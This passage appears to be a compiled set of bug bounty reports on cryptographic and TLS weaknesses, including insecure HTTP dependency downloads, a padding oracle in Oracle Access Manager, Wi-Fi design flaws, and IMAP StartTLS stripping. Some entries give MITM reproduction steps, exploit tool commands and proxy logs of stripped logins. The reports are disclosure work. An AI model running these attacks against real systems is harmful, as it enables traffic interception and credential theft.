+2.2.0 at /usr/local/bin/pygmentize
+
+svn
+
+Not Available
+
+**Reproduction Steps:**
+Request a second factor for a user authenticated  with username and password, count the characters presented. It should be 32 not 16.
+
+Problematic code is 
+src/applications/auth/factor/PhabricatorTOTPAuthFactor.php:   
+ return strtoupper(Filesystem::readRandomCharacters(16));
+
+readRandomCharacters from phutils returns a random string using base32 characters.
+
+## Impact
+
+I have rated this a no impact, however I am not a cryptographer, and it is a clear violation of a cryptographic minimum key length requirement in a published RFC. Quantum supremacy may also be relevant here.
+
+===== #505007 · [Twitter Open Source] Releases were & are built/executed/tested/released in the context of insecure/untrusted code
+   program: x · bounty: 280.0 · module: cert-validation-weak-secrets-insecure-channel · full-body
+--- BODY ---
+**Summary:**
+
+[CWE-829: Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
+[CWE-494: Download of Code Without Integrity Check](https://cwe.mitre.org/data/definitions/494.html)
+
+Twitter maintains several Open Source Projects under the [Twitter GitHub organization](https://github.com/twitter). These projects contain build files that indicate that some of these projects are resolving dependencies over HTTP instead of HTTPS. This allows these artifacts to be potentially MITMed to maliciously compromise them and infect the build artifacts that are produced. Additionally, if any of these JARs or other dependencies were compromised, any developers or production servers using these could continue to be infected past updating to fix this.
+
+**Description:**
+
+This attack leverages the build infrastructure loading dependencies over HTTP without any other sort of integrity check to allow them to be maliciously compromised.
+
+### This isn't just theoretical
+POC code has existed since 2014 to maliciously compromise a JAR file inflight.
+See:
+* https://max.computer/blog/how-to-take-over-the-computer-of-any-java-or-clojure-or-scala-developer/
+* https://github.com/mveytsman/dilettante
+
+### MITM Attacks Increasingly Common
+See:
+* https://serverfault.com/a/153065
+* https://security.stackexchange.com/a/12050
+* [Comcast continues to inject its own code into websites you visit](https://thenextweb.com/insights/2017/12/11/comcast-continues-to-inject-its-own-code-into-websites-you-visit/#) (over HTTP)
+
+### Source Locations
+
+#### Insecure Download
+
+##### Scrooge
+  - https://github.com/twitter/scrooge/blob/b8fb8b563cb152b5d46c2ec8a24c9c134cdde140/project/plugins.sbt#L1-L6
+ 
+##### Tormentia
+ - https://github.com/twitter/tormenta/blob/50cf4773fd188a6ae82ab87e306a58c064cced1e/project/plugins.sbt#L1-L3
+
+##### Scalding
+ - https://github.com/twitter/scalding/blob/19429900e9fcdaa5c38160f0b68b579aac3f4604/project/plugins.sbt#L1-L7
+
+##### Diffy
+ - https://github.com/twitter/diffy/blob/7894459430d27d184d3663e0570f535a93fa61c6/project/plugins.sbt#L3
+
+##### Bijection
+ - https://github.com/twitter/bijection/blob/11c8325bb734bb3bd36d8d7ac6dd1dd48d82f7e3/project/plugins.sbt#L2
+
+##### Algebird
+ - https://github.com/twitter/algebird/blob/01f989f4ad534c1450ab0982669393ba1817a6d1/project/plugins.sbt#L1-L5
+
+##### Hdfs-Du
+ - https://github.com/twitter/hdfs-du/blob/5caaa0cf117ed1ebbe873ec1e8302a535bd0bc5d/pom.xml#L64-L75
+
+##### Iago
+ - https://github.com/twitter/iago/blob/019a4adfbfa913e6307cdc5a589089e95cfb6285/examples/echo/pom.xml#L17-L28
+
+##### Ambrose
+- https://github.com/twitter/ambrose/blob/da7bcb932c418c157d9c372a4ca5f1884b874d78/cascading/pom.xml#L14-L19
+- https://github.com/twitter/ambrose/blob/da7bcb932c418c157d9c372a4ca5f1884b874d78/scalding/pom.xml#L22-L27
+
+###### BookKeeper
+ - https://github.com/twitter/bookkeeper/blob/91c85ab8350dfc00c2bc07f0bed338ce4d87b2f6/bookkeeper-stats-providers/twitter-finagle-provider/pom.xml#L48-L53
+
+###### Elephant-Bird
+
+- https://github.com/twitter/elephant-bird/blob/62642c935198aa0ff968f48669c7e654b42dfbf0/cascading3/pom.xml#L13-L18
+
+###### JOAuth
+- https://github.com/twitter/joauth/blob/b4f6afb6be79ecb0bb8d04c76b17cfa51de4ffab/project/plugins/Plugins.scala#L10-L16
+
+###### Ect...
+
+This list is not exaustive, I just wanted to come up with examples so the Twitter security team could get a general sense of what they are looking for.
+
+Here are the GitHub queries I used to find these:
+ - [SBT Builds with Resolvers over HTTP](https://github.com/search?q=org%3Atwitter+resolvers+http%3A%2F%2F&type=Code)
+ - [Maven POM files with Repositories over HTTP](https://github.com/search?l=Maven+POM&p=2&q=org%3Atwitter+repositories+http%3A%2F%2F&type=Code)
+
+**WARNING!** If any of these builds are using a shared or reused `~/.gradle`, `~/.m2` or whatever SBT uses as an artifact cache between builds and any of these downloads were maliciously compromised, the compromised jar may remain inside of cache directory and continue to be used in future builds.
+
+### Fix and Public Disclosure
+
+At a minimum, all of these code locations where artifacts are downloaded from an untrusted source needs to be fixed. Previous releases should be rebuilt with the fix applied. The checksum of the released artifacts and artifacts built in a trusted environment should be made. If the checksums match, you can be certain that they weren't compromised.
+
+If the checksums don't match, indicating a compromised artifact, CVE numbers need to be issued for the potentially malicious artifacts.
+
+The ability to check if checksums match assume that these projects have [reproducible builds](https://en.wikipedia.org/wiki/Reproducible_builds).
+
+## Steps To Reproduce:
+
+  1. Cone the Impacted Project
+  2. Change this line in Dilettante so it is targeting the repository used in the build.
+       https://github.com/mveytsman/dilettante/blob/master/dilettante.py#L143
+  3. Start Dilettante on your local machine.
+  4. Proxy the HTTP traffic for the build through Dilettante
+  5. Execute the Build's tests.
+  6. You should be greeted with the image of a cat.
+
+
+## Other Places to Look
+
+Given how widely I'm finding this vulnerablity externally to Twitter, I'd advise that the Twitter Security team take some time to also analize their internal infrastructure for similar vulnerabilities.
+
+**This responsible disclosure follows [Google's 90-day vulnerability disclosure policy](https://www.google.com/about/appsecurity/) (I'm not an employee of Google, I just like their policy).**
+
+## Impact
+
+By insecurely downloading code over an untrusted connection HTTP and executing the untrusted code inside of these JAR files as part of the unit/integration tests before a release opens these artifacts up to being maliciously compromised.
+
+Remote code execution on a production server. Malicious compromise of build artifacts.
+
+===== #728110 · [HTAF4-213] [Pre-submission] CVE-2018-2879 (padding oracle attack in the Oracle Access Manager) at https://█████████
+   program: deptofdefense · bounty: 3000.0 · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+##Description
+We were able to identify CVE-2018-2879 in Oracle Access Manager, used on the https://██████
+Link to the CVE: https://nvd.nist.gov/vuln/detail/CVE-2018-2879
+This vulnerability is rated critical, and may allow unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager.
+It's possible to conduct padding oracle attack and recover plaintext from `encquery` parameter
+Materials:
+https://sec-consult.com/en/blog/2018/05/oracle-access-managers-identity-crisis/
+
+##POC
+We modified https://github.com/redtimmy/OAMBuster/blob/master/oambuster.py proof-of concept for https://█████ (it required some changes, for example `gcds-consent=true` is necessary in all requests to not face with consent banner page.
+Here is it:
+█████████
+It can be launched in the next way to simply test for padding oracle and recover plaintext:
+```
+oambuster.py -d https://██████████
+```
+The result (decrypt process can take some time, for example on the screenshot above it's not fully finished, but you can already see readable parts):
+███████
+
+This confirms that vulnerability is valid.
+
+##Suggested fix
+Apply patch & update OAM instance
+
+## Impact
+
+Padding oracle attack allows us to decrypt any messages. As all the encrypted messages (encquery, encreply, OAMAuthnCookie) are encrypted with the same key, we can decrypt any of these messages.
+This attack can also be used to encrypt messages. So if we construct a valid authentication cookie and encrypt it with our padding oracle attack, we can pass it off as valid to the web server and perform authentication bypass. 
+
+We will research this further and will update report with new information.
+
+===== #745276 · Dragonblood: Design and Implementation Flaws in WPA3 and EAP-pwd
+   program: ibb · bounty: None · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+Full background information is at [our website](wpa3.mathyvanhoef.com) and detailed information can be found in our [research paper](https://eprint.iacr.org/2019/383).
+
+# Vulnerability Summary
+
+## First Disclosure
+
+Summarized, the Dragonfly handshake of WPA3 and EAP-pwd is supposed to prevent dictionary attacks. However, we discovered design flaws that still enable an adversary to perform dictionary attacks. In particular, we discovered the following design flaws in WPA3 and EAP-pwd:
+- Against EAP-pwd, a timing leak exists for all supported elliptic curves. An adversary within range of the victim can induce clients to connect to the adversary's Access Point (AP) and exploit this timing leak. The leaked information can be used to perform a dictionary attack on the password.
+- Against WPA3, a similar timing leak is possible when using MODP cryptographic groups.
+- Against both EAP-pwd and WPA3, we discovered a cache-based side-channel attack. An adversary that can run unprivileged code on a victim's machine (e.g. through an unprivileged Android app) and can abuse the leaked information to perform a dictionary attack on the password.
+- Against a network that supports WPA2 and WPA3 simultaneously, we demonstrated that new WPA3 clients can still be downgraded to WPA2. This means all vulnerabilities of WPA2 still apply.
+- Against WPA3 we also discovered a downgrade attack that tricks the client or AP into using a weaker elliptic curve than devices normally would.
+
+We also discovered the following implementation flaws in EAP-pwd and WPA3 products:
+- All tested EAP-pwd implementations (FreeRADIUS, Radiator, wpa_supplicant, Hostapd, Intel's iwd, Aruba's EAP-pwd) were vulnerable to Invalid Curve Attacks. An adversary can abuse this to trivially bypass authentication and connect to any network that supports EAP-pwd. This corresponds to CVE-2019-9498, CVE-2019-9499 and CVE-2019-11235.
+- The WPA3 implementation of Intel's IWD client was also vulnerable to an invalid curve attack.
+- Aruba's EAP-pwd implementation for Windows didn't generate secure random numbers, and this can be abused to create a rogue AP and subsequently man-in-the-middle all traffic of the client.
+- Most EAP-pwd implementations were also vulnerable to a reflection attack. Fortunately, this is a more theoretic attack with low practical impact. This corresponds to CVE-2019-9497 and CVE-2019-11234.
+
+## Second Disclosure
+
+After our first disclosure, the Wi-Fi Alliance released security guidelines on how to implement WPA3. Unfortunately, these guidelines still contained flaws. Summarized, we found that:
+- Timing-based side-channel attacks against WPA3's Dragonfly handshake remain possible when using Brainpool curves (CVE-2019-13377).
+- In FreeRADIUS we found an implementation-specific side-channel that allowed an adversary to gain enough information to perform a dictionary attack. No tedious timing attacks are needed to exploit this side-channel. This corresponds to CVE-2019-13456.
+
+# Updates to WPA3 and EAP-pwd
+
+- The Wi-Fi Alliance released [security guidelines](https://wpa3.mathyvanhoef.com/WPA3_Security_Considerations_20190410.pdf) on how to prevent our attacks in a backwards-compatible manner. Unfortunately, this defence is costly on resource-constrained devices.
+- The IEEE is [updating the Dragonfly handshake](https://mentor.ieee.org/802.11/dcn/19/11-19-1173-18-000m-pwe-in-constant-time.docx) to avoid the discovered side-channels. Note that HostAP already has an [experimental implementation](https://w1.fi/cgit/hostap/tree/src/common/sae.c?id=5b50265e133d2ce111211e69d584ba71bf0551e4#n617) of this update.
+- [Updates to EAP-pwd](https://tools.ietf.org/html/draft-harkins-eap-pwd-prime-00) are proposed as well but are not yet implemented by any vendors.
+- Samsung patched the Galaxy S10 to prevent downgrade attacks to WPA2.
+
+## Impact
+
+The design issues in WPA3 and EAP-pwd allow an adversary to perform dictionary (and brute-force) attacks on the password.
+
+The invalid curve attacks against all EAP-pwd and selected WPA3 implementations allow an adversary to bypass authentication.
+
+The impact of other vulnerabilities is summarized above and also explained on [our website](wpa3.mathyvanhoef.com).
+
+===== #852841 · Reduced purmations on encryption
+   program: nextcloud · bounty: None · module: cert-validation-weak-secrets-insecure-channel · full-body
+--- BODY ---
+## [`OC\Security\SecureRandom::generate`](https://github.com/nextcloud/server/blob/92692cdd7ab42453b38f1ba684649c86f2d488c0/lib/private/Security/SecureRandom.php#L49)
+
+### Reduced Permutations
+
+`OC\Security\SecureRandom::generate` will by default use `a-Z0-9+/` (64 bytes) character set. The numbers are not predictable, due to the use of [`random_int`](https://www.php.net/manual/en/function.random-int.php).
+
+Most notably the [`OC\Security\Crypto::encrypt`](https://github.com/nextcloud/server/blob/92692cdd7ab42453b38f1ba684649c86f2d488c0/lib/private/Security/Crypto.php#L91) method uses an [IV](https://github.com/nextcloud/server/blob/92692cdd7ab42453b38f1ba684649c86f2d488c0/lib/private/Security/Crypto.php#L97) with a [length of 16 bytes](https://github.com/nextcloud/server/blob/92692cdd7ab42453b38f1ba684649c86f2d488c0/lib/private/Security/Crypto.php#L51). It is chosen randomly via `OC\Security\SecureRandom::generate` with the default character set. There are 256 possible bytes, but in this case it is *actually* 64 bytes. The permutations is 64^16 (instead of 256^16), which equates to a 12-byte, or 96-bit IV (instead of the expected 16-byte, or 128-bit IV). __Use raw bytes when doing cryptographic operations, via [`random_bytes`](https://www.php.net/manual/en/function.random-bytes.php).__
+
+Do not use `OC\Security\Crypto::generate` for cryptographic keys.
+
+
+### Cache Timing Attacks
+
+It is *potentially* vulnerable to [cache timing attacks](https://en.wikipedia.org/wiki/Side-channel_attack) because the secret number is used as an index to look up a byte value in string. [Read more about cache-timing attacks here](https://blog.ircmaxell.com/2014/11/its-all-about-time.html#Other-Types-Of-Timing-Attacks-Index-Lookup).
+
+## Impact
+
+1. Reduced permutations increase the chances of IV re-use (which can destroy confidentially), and bring encryption key strength down (chances are still too low with a 256-bit encryption key).
+
+2. If the complex cache timing attack vector exists, and is abused: it is possible to determine secret values generated with `OC\Security\SecureRandom::generate`.
+
+===== #896299 · Java: CWE-297 Insecure JavaMail SSL configuration
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #903424 · SSL certificate not validated when registering with a provider
+   program: nextcloud · bounty: 300.0 · module: cert-validation-weak-secrets-insecure-channel · full-body
+--- BODY ---
+## Description
+
+When running the desktop client for the first time, users can click the "Register with a provider" button to sign up for a Nextcloud account with a Nextcloud cloud provider. Clicking "Register..." opens a web page in a Nextcloud desktop client window with content from https://nextcloud.com/register.
+
+However, the desktop client doesn't appear to validate the SSL certificate for nextcloud.com. An attacker between the user and nextcloud.com could replace the certificate with their own invalid cert and conduct a man in the middle attack. The attacker could control the page content displayed to the user.
+
+This appears to affect Windows and Linux Nextcloud desktop clients. I don't have a Mac so haven't tested the Mac client.
+
+## Reproduction
+
+If you have Burp HTTP proxy, set the Nextcloud client to proxy traffic through Burp. Click "Register with a provider"; Burp should receive the request. This demonstrates vulnerability presence because the Nextcloud client should alert on Burp's self signed certificate, but doesn't.
+
+Otherwise, I wrote a quick python script to demonstrate the vulnerability. You will need at least 1 Linux machine to run the script on. You can run Nextcloud desktop on it too or on another device.
+
+1. Download the attached nc_desktop_mitm.py, nc_key.pem (private key), and nc_cert.pem (public cert) files to a Linux machine. 
+2. Start the nc_desktop_mitm.py script. The option -k specifies the private key file and -c specifices the public cert file. Sudo is required because we bind to port 443: sudo python3 nc_desktop_mitm.py -k nc_key.pem -c nc_cert.pem
+3. Note the IP address of the machine running the script.
+4. Now we need to mimic what an attacker could accomplish through ARP poisoning, DNS spoofing, or by controlling a router between the victim and nextcloud.com. However, MiTM techniques like these are tedious to setup, so we'll cheat... Open the hosts file on the device where you are running Nextcloud desktop.
+5. Add an entry to point nextcloud.com to the IP of the machine running the script. Save and close the hosts file.
+6. Open Nextcloud desktop client and click "Register with a provider".
+7. The Nextcloud client displays my custom proof of concept page, indicating the client trusted the invalid cert.
+
+I've attached a screenshot of what the Nextcloud client should show after clicking "Register with a provider" if the reproduction steps worked.
+
+Tested Nextcloud desktop client version 2.6.4stable (build 20200303) on Ubuntu 18.04 and Windows 10. If I can provide further information please let me know. Thanks!
+
+## Impact
+
+An attacker can serve untrusted HTML, Javascript, etc in the trusted context of the desktop client. A typical user is likely inclined to trust what is shown to them in the Nextcloud app compared to a web browser page; they won't even know it's web content necessarily and may assume it's native to the Nextcloud client.
+
+ A likely attack vector would be to replace the content with a fake login page and try to get the user to login. If the user clicks "Register with a provider", a window asking them to "Sign in with Google/Facebook/Apple to access your new Nextcloud account!" or similar might net the attacker something useful. Such an attack would probably have a decent success rate given the circumstances.
+
+If an attacker just passively eavesdrops on the user's traffic, near as I can tell the attacker can collect the user's email as it gets POSTed to nextcloud.com during the registration process. A user's email is private, but the usefulness to an attacker seems limited without other associated user information.
+
+===== #917454 · Java: CWE-273 Unsafe certificate trust
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #917456 · [Java] CWE-295 - Incorrect Hostname Verification - MitM
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #953219 · SMTP interaction theft via MITM
+   program: portswigger · bounty: None · module: tls-starttls-legacy-protocol · full-body
+--- BODY ---
+See http://www.postfix.org/CVE-2011-0411.html for adetailled description.
+
+## Impact
+
+MitM could obtain user credentials.
+
+===== #1039504 · Some build dependencies are downloaded over an insecure channel (without subsequent integrity checks)
+   program: ibb · bounty: 100.0 · module: cert-validation-weak-secrets-insecure-channel · full-body
+--- BODY ---
+## Summary:
+
+Build jobs [`mingw64 | openssl-1.1.1d`](https://github.com/OpenVPN/openvpn/blob/master/.travis.yml#L87) and [`mingw32 | openssl-1.0.2u`](https://github.com/OpenVPN/openvpn/blob/master/.travis.yml#L91) download dependencies from `build.openvpn.net` and `www.oberhumer.com`over an insecure channel (`http`, _not_ `https`) and do not check their integrity in any way.
+
+This opens the door to person-in-the-middle attacks, whereby an attacker controlling an intermediate node on the network path between Travis CI's build servers and those two servers could manipulate traffic and inject his own malicious code into the artifacts produced by the two jobs in question.
+
+## Steps To Reproduce:
+
+The `install` phase of the `.travis.yml` file [unconditionally executes](https://github.com/openvpn/openvpn/blob/master/.travis.yml#L120) the `.travis/build-deps.sh` script. If the following three conditions are satisfied,
+
+1. [the OS be other than `windows`](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L4),
+2. [environment variable `SSLLIB` be set to `openssl`](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L148), and
+3. [environment variable `CHOST` be set](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L161),
+
+(they are only satisfied for build jobs [`mingw64 | openssl-1.1.1d`](https://github.com/OpenVPN/openvpn/blob/master/.travis.yml#L87) and [`mingw32 | openssl-1.0.2u`](https://github.com/OpenVPN/openvpn/blob/master/.travis.yml#L91)), then shell functions `download_tap_windows` and `download_lzo` are executed [one](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L162) after the [other](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L165).
+
+Shell functions `download_tap_windows` and `download_lzo` are defined above ([here](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L18) and [here](https://github.com/OpenVPN/openvpn/blob/master/.travis/build-deps.sh#L18), respectively) in `.travis/build-deps.sh`:
+
+```shell
+download_tap_windows () {
+    if [ ! -f "download-cache/tap-windows-${TAP_WINDOWS_VERSION}.zip" ]; then
+       wget -P download-cache/ \
+           "http://build.openvpn.net/downloads/releases/tap-windows-${TAP_WINDOWS_VERSION}.zip"
+    fi
+}
+
+download_lzo () {
+    if [ ! -f "download-cache/lzo-${LZO_VERSION}.tar.gz" ]; then
+        wget -P download-cache/ \
+            "http://www.oberhumer.com/opensource/lzo/download/lzo-${LZO_VERSION}.tar.gz"
+    fi
+}
+```
+
+Note that both `wget` commands use `http` as opposed to `https` ( though using `https` is readily possible, since both  domains `build.openvpn.net` and `www.oberhumer.com` support `https` and have valid TLS certificates) .
+
+## Supporting Material/References:
+
+To be added in a comment below when my custom build of OpenVPN/openvpn finishes on travis-ci.org (it's taking a while...).
+
+## Impact
+
+The two dependencies are downloaded over an insecure channel and, therefore, can be intercepted and tampered with by a person in the middle (controlling an intermediate node on the network path between Travis CI's build servers).
+
+Moreover, as no integrity checks seem to be performed after download, a person-in-the-middle attack would go undetected and could seriously compromise the integrity of the artifacts produced by those two build jobs.
+
+Please do not dismiss the possibility of such an attack too quickly, as it is [not as far-fetched as one would think](https://medium.com/bugbountywriteup/want-to-take-over-the-java-ecosystem-all-you-need-is-a-mitm-1fc329d898fb).
+
+===== #1094343 · [Java] CWE-326: Query to detect weak encryption with an insufficient key size
+   program: github-security-lab · bounty: 4500.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1100379 · [Java] CWE-295: Disabled certificate validation in JXBrowser
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1123360 · [Java] CWE-327: Add more broken crypto algorithms
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1130416 · SHA512 incorrect on most/many releases
+   program: kubernetes · bounty: None · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+Report Submission Form
+
+## Summary:
+SHA512 is incorrect for most versions of kubernetes.tar.gz releases (https://github.com/kubernetes/kubernetes/releases/).
+
+## Kubernetes Version:
+all
+
+## Component Version:
+all
+
+## Steps To Reproduce:
+[add details for how we can reproduce the issue, including relevant cluster setup and configuration]
+
+curl -sLO https://github.com/kubernetes/kubernetes/releases/download/v1.20.0/kubernetes.tar.gz
+shasum -a 512 kubernetes.tar.gz (mac)
+openssl dgst -sha512 kubernetes.tar.gz (linux)
+sha512sum kubernetes.tar.gz (linux)
+
+All report:
+ebfe49552bbda02807034488967b3b62bf9e3e507d56245e298c4c19090387136572c1fca789e772a5e8a19535531d01dcedb61980e42ca7b0461d3864df2c14
+
+Per website, it should be:
+cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e
+
+## Supporting Material/References:
+https://github.com/kubernetes/kubernetes/releases/tag/v1.20.0
+
+another example:
+
+https://github.com/kubernetes/kubernetes/releases/tag/v1.19.5
+
+Same SHA512:
+cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e
+
+## Impact
+
+I suspect its an automation release issue (hence same hash in all places).
+
+* Impact 1: Can't verify artifact is correct artifact.
+* Impact 2: Hacked?
+
+===== #1161808 · [Java] CWE-759: Query to detect password hash without a salt
+   program: github-security-lab · bounty: 1000.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1178562 · imap: StartTLS stripping attack (CVE-2016-0772).
+   program: ruby · bounty: 500.0 · module: tls-starttls-legacy-protocol · full-body
+--- BODY ---
+`net/imap` does not seem to raise an exception when the remote end (imap server)  fails to respond with `tagged_response` (NO/BAD) or `OK` to an explicit call of `imap.starttls`. This may allow a malicious MITM to perform a starttls stripping attack if the client code does not explicitly set `usessl = true` on ` initialize` where it is disabled by default: it is rarely done as one might expect that `starttls` raises an exception when starttls negotiation fails (like when using `usessl` on a server that does not support it or when it fails to negotiate tls due to an ssl exception/cipher mismatch/auth fail).
+
+The vulnerable code:
+```ruby
+    def starttls(options = {}, verify = true)
+      send_command("STARTTLS") do |resp|
+        if resp.kind_of?(TaggedResponse) && resp.name == "OK"
+          begin
+            # for backward compatibility
+            certs = options.to_str
+            options = create_ssl_params(certs, verify)
+          rescue NoMethodError
+          end
+          start_tls_session(options)
+        end # <--- End of handling :)
+      end
+    end
+```
+
+# PoC
+
+For instance, we have the following client code:
+```ruby
+require 'net/imap'
+
+imap = Net::IMAP.new('0.0.0.0', 9999)
+imap.starttls
+imap.login('myLOGIN','myPASSWORD')                                            # test login
+#imap.authenticate('LOGIN', 'joe_user', 'joes_password') # test auth
+imap.disconnect
+```
+Start the proxy: `python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError`
+ (See `striptls.py` in attachments).
+
+Proxy output:
+```bash
+$  python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError
+2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> client ('127.0.0.1', 39154) has connected
+2021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> connecting to target ('imap.yandex.ru', 143)
+2021-04-28 18:43:27,347 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server]          '* OK Yandex IMAP4rev1 at myt3-8d2078fedea5.qloud-c.yandex.net:143 ready to talk with ::ffff:188.138.209.162:62549, 2021-Apr-28 18:43:52, qheZ7J3friE1\r\n'
+2021-04-28 18:43:27,348 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithError new: True>
+2021-04-28 18:43:27,348 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0001 STARTTLS\r\n'
+2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\r\n'
+2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server][mangled] None
+2021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0002 LOGIN myLOGIN myPASSWORD\r\n'
+...
+```
+As you can see, `starttls` did not return any error to the client and `LOGIN` authentication started.
+`AUTH` is the same:
+```
+2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'RUBY0001 STARTTLS\r\n'
+2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\r\n'
+2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
+2021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'RUBY0002 AUTHENTICATE'
+2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          ' LOGIN\r\n'
+2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+\r\n'
+2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
+2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lX3VzZXI=\r\n'
+2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
+2021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
+2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA==\r\n'
+2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
+2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
+2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA==\r\n'
+2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
+2021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
+2021-04-28 18:47:00,582 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA=='
+2021-04-28 18:47:00,582 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          '\r\n'
+2021-04-28 18:47:00,635 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server]          'RUBY0002 BAD Command syntax error. sc=PleRNJ32YGk1_281547_4-d4596b06cae3\r\n'
+```
+
+I set the same CVSS as CVE-2016-0772 has.
+
+## Impact
+
+Allows man-in-the-middle attackers to bypass the TLS protections by leveraging a network position between the client and the registry to block the StartTLS command, aka a "StartTLS stripping attack."
+
+===== #1184041 · [JAVA]: CWE-347 - Improper Verification of Cryptographic Signature : Potential for Auth Bypass
+   program: github-security-lab · bounty: 4500.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1212272 · [GO]: CWE-326: Insufficient key size
+   program: github-security-lab · bounty: 1800.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1212274 · [JAVA]: CWE-347 - Improper Verification of Cryptographic Signature : Potential for Auth Bypass
+   program: github-security-lab · bounty: 4000.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1219493 · [Java] CWE-295 - Incorrect Hostname Verification - MitM
+   program: github-security-lab · bounty: 4000.0 · module: _adjacent_unclassified · metadata-only
+--- BODY ---
+This bug was reported directly to GitHub Security Lab.
+
+===== #1238470 · Fragmentation and Aggregation Flaws in Wi-Fi
+   program: ibb · bounty: None · module: crypto-primitives-oracles-signatures · full-body
+--- BODY ---
+I discovered three design flaws in the Wi-Fi standard and widespread related implementation flaws ([see GitHub overview and test tool](https://github.com/vanhoefm/fragattacks#fragattacks-fragmentation--aggregation-attacks)). **Here I'll specifically cover open source software**. These findings have not received bug bounties from other sources.
+
+
+# Implementation flaws allowing trivial packet injection
+
+- [CVE-2020-26140](https://nvd.nist.gov/vuln/detail/CVE-2020-26140): Accepting plaintext data frames in a protected network. This allows trivial packet injection. On a Linux client, the AWUS036H network card is vulnerable and two out of four Linux-based **home routers** were vulnerable. On **NetBSD access points**, three out of four tested network cards were vulnerable, and on FreeBSD access points, the F5D8053 network card was vulnerable.
+
+- [CVE-2020-26143](https://nvd.nist.gov/vuln/detail/CVE-2020-26143): Accepting fragmented plaintext data frames in a protected network. This allows trivial packet injection. On a **Linux client**, 7 out of 16 network cards were vulnerable. On FreeBSD access points, two out of four tested network cards were vulnerable.
+
